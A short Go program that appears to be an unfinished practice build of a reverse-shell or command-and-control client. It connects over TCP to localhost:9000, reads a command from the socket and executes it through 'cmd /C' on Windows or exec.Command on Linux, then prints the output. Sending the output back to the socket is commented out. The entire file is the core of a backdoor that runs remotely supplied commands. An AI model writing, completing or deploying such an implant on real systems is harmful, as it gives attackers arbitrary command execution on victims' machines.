package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

// Check Operating System
func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		fmt.Println("OS identified as Windows")
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		fmt.Println("OS identified as: Linux")
		OSShell = "linux"

	}
	return OSShell

}

func main() {
	fmt.Println("LOADING")
	conn, err := net.Dial("tcp", "localhost:9000")
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	//reading command in
	command, _ := ioutil.ReadAll(conn)
	var results string
	commandString := string(command)
	// popssible client code once receing command
	checkOS := OSCheck()
	if checkOS == "windows" {
		fmt.Println("WINDOWS")
		CommandExec, err := exec.Command("cmd", "/C", commandString).Output()
		if err != nil {
			fmt.Println("Error executing command", err)
		}
		CommandExec2 := string(CommandExec)
		results = strings.TrimSpace(CommandExec2)
		// fmt.Println(reflect.TypeOf(CommandExec))
		// fmt.Println(reflect.TypeOf(err))

	} else if checkOS == "linux" {
		fmt.Println("LINUX")
		//fmt.Println("XS", command)
		CommandExec, err := exec.Command(strings.TrimSpace(commandString)).Output()
		if err != nil {
			fmt.Println("Error executing command", err)
		}
		CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
		results = strings.TrimSpace(CommandExec2)
	}

	fmt.Println(results)
	// io.WriteString(conn, results)
}
